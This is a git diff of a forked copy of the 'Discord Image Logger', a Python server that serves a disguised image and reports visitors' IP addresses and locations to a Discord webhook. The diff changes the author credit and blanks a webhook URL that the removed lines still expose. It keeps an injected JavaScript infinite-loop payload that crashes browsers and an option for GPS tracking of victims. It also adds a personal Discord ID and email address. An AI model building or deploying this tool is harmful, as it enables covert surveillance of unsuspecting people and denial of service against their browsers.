@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# By Tim$erz | https://github.com/timzz71
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1346068792148758610/b9zKYoNtBHeCco-lE1jjaPMJ5dim4-1T8z8yAJ_-or6OAjBURu6cHKkwS8kR-U-vcJR5",
-    "image": "https://cdn.discordapp.com/attachments/1147627434968088687/1348396031712170036/Screenshot_2025-01-23_204813.png?ex=6872c929&is=687177a9&hm=353902be05a97b0817fafdc2ad3b2d4de45b91e212cb4140ea6125f843d3abff&", # You can also have a custom image by using a URL argument
+    "webhook": "",
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work.
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/timzz71/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -262,8 +262,7 @@ height: 100vh;
                     data = message.encode()
                 
                 if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
-
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                 self.send_response(200) # 200 = OK (HTTP Status)
@@ -302,3 +301,8 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
+
+# Any Errors Can Be Reported And Sent To My Dms 
+# User Id: 884763850749120544
+# Dc Name: Crypted3057
+# Gmail: timcrypted3057@gmail.com
